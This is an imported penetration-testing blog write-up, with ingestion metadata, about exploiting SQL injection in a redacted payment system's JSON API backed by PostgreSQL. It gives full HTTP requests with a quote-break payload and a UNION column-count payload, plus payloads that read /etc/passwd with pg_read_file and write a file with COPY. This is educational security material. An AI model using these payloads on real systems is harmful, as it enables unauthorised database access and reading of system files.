---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-23_sql-injection-on-postgresql.md
original_filename: 2024-01-23_sql-injection-on-postgresql.md
title: SQL Injection on PostgreSQL
category: blogs
detected_topics:
- sso
- access-control
- sqli
- command-injection
- cors
- csrf
tags:
- imported
- blogs
- sso
- access-control
- sqli
- command-injection
- cors
- csrf
language: en
raw_sha256: 37a031f283ad1de4b39fa9d595c336f31203739a6706aa6d85cba25a6dc8deab
text_sha256: 08ef58f26920f89a468add89b9d60e8d1bf21de6803a4f46aeaf0b337ffa0109
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# SQL Injection on PostgreSQL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-23_sql-injection-on-postgresql.md
- Source Type: markdown
- Detected Topics: sso, access-control, sqli, command-injection, cors, csrf
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `37a031f283ad1de4b39fa9d595c336f31203739a6706aa6d85cba25a6dc8deab`
- Text SHA256: `08ef58f26920f89a468add89b9d60e8d1bf21de6803a4f46aeaf0b337ffa0109`


## Content

---
title: "SQL Injection on PostgreSQL"
url: "https://medium.com/@yagizkocer/sql-injection-on-postgresql-8c8f823e44aa"
authors: ["Yağız Koçer"]
bugs: ["SQL injection"]
publication_date: "2024-01-23"
added_date: "2024-01-25"
source: "pentester.land/writeups.json"
original_index: 508
scraped_via: "browseros"
---

# SQL Injection on PostgreSQL

SQL Injection on PostgreSQL
Yağız Koçer
Follow
3 min read
·
Jan 23, 2024

201

1

Press enter or click to view image in full size

Hi folks, today I will share a scenario that I faced while doing penetration testing on a popular payment system. The company will be called redacted.com for the rest of the write-up. Let’s go!

Very Simple Foothold: Put the quote, get the error

When discovering the endpoints, noticed a request that looked like sending a JSON with parameters that define the values for the query. Tried to put a quote on the “Id” parameter.

POST /api/ppg/Portal/GetMerchantDropdown HTTP/1.1
Host: redacted.com:20001
Content-Length: 102
Sec-Ch-Ua: 
Accept: application/json, text/plain, */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Authorization: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://redacted.com:10903
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://redacted.com:10903/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"Take":1,"Skip":0,"Id":"1-2651'"}

Got a response with an error

Press enter or click to view image in full size

When I searched for the error message, I understood that it was caused by the query and also I verified that it is a PostgreSQL error. We took our first step for SQL Injection!

Broking the query is done. Now fix it.

Since the endpoint is retrieving some data, the first thing that came to my mind is gluing the query with another query that we will inject and getting some nifty extra data. To do so, I need to use the Union Attack method and merging with my inject query. You can read this amazing material which I also got a lot of help while doing this assessment -> https://portswigger.net/web-security/sql-injection/union-attacks

Get Yağız Koçer’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The first thing to do is determine how many columns return in the original query. I chose the null payload method, the basic idea is you need to union the original query with null selects until you match the column numbers with the original one, you will add the nulls until you get no errors on your injected query. Here is the final payload that didn’t return an error.

POST /api/ppg/Portal/GetMerchantDropdown HTTP/1.1
Host: redacted.com:20001
Content-Length: 102
Sec-Ch-Ua: 
Accept: application/json, text/plain, */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Authorization: ..
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://redacted.com:10903
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://redacted.com:10903/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"Take":1,"Skip":0,"Id":"1-2651' union select null, null, null, null, null;--"}

For testing the query to see if it returns any data that we will inject, I tried information_schema.tables. to retrieve the table information from the database and here is the result.

Press enter or click to view image in full size

And we conclude that we got results. Below are different payloads that I was able to run in the vulnerable endpoint.

Reading a file from the instance => {"Take":1,"Skip":0,"Id":"1-2651' union select null, pg_read_file('/etc/passwd'), null, null, null;--"}

Writing to files => {"Take":100,"Skip":0,"Id":"1-2651'; COPY (SELECT 'hello') TO '/tmp/pentestlab';--"}

Conclusion

If you are still reading this, thank you for your time. Sometimes we feel hopeless trying the things we know and are still waiting for a result, but this example scenario was exactly like an intro lesson for SQL injection. My advice is never to give up even for simple things. Happy hacking!
